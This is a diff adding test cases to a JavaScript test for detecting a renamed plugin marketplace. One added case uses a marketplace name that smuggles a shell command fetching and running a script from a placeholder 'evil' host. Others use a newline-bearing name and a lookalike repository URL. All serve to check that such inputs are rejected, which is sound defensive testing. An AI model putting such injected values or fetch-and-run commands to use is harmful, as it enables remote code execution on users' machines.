@@ -9,6 +9,11 @@ test('an install under the old marketplace name is told to move; the current nam
   expect(marketplaceRenamed(github(true, 'tessera'))).toBe('tessera')
   expect(marketplaceRenamed(github(true))).toBe(undefined)
   expect(marketplaceRenamed({ extraKnownMarketplaces: { tessera: { source: { source: 'directory', path: 'I:/tessera' } } } })).toBe(undefined)
+  // The name goes into commands shown to the person, so only a plain one counts, and only our repository.
+  expect(marketplaceRenamed({ extraKnownMarketplaces: { 'x$(curl -s https://evil/p|sh)': { source: { source: 'github', repo: 'OG-Matcha/tessera' } } } })).toBe(undefined)
+  expect(marketplaceRenamed({ extraKnownMarketplaces: { 'a\nb': { source: { source: 'github', repo: 'OG-Matcha/tessera' } } } })).toBe(undefined)
+  expect(marketplaceRenamed({ extraKnownMarketplaces: { t: { source: { source: 'git', url: 'https://evil.com/OG-Matcha/tessera' } } } })).toBe(undefined)
+  expect(marketplaceRenamed({ extraKnownMarketplaces: { t: { source: { source: 'git', url: 'git@github.com:OG-Matcha/tessera.git' } } } })).toBe('t')
 })
 
 test('a session under the old marketplace name shows the move once, and copying the commands settles it', { options: { language: 'en', carryOver: false } }, async ($, on) => {
